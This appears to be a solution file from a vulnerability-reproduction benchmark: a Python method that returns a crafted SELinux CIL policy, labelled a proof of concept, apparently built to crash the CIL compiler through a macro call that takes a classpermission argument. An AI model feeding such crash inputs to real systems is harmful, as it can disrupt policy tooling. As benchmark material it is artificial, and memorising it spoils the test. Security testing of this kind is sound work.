class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = (
            "(class c (p))\n"
            "(classorder (c))\n"
            "(sid s)\n"
            "(sidorder (s))\n"
            "(user u)\n"
            "(role r)\n"
            "(type t)\n"
            "(category k)\n"
            "(categoryorder (k))\n"
            "(sensitivity e)\n"
            "(sensitivityorder (e))\n"
            "(sensitivitycategory e (k))\n"
            "(context x (u r t ((e) (e))))\n"
            "(sidcontext s x)\n"
            "(macro m ((classpermission n)) (classpermissionset n (c (p))))\n"
            "(call m ((c (p))))\n"
        )
        return poc.encode('utf-8')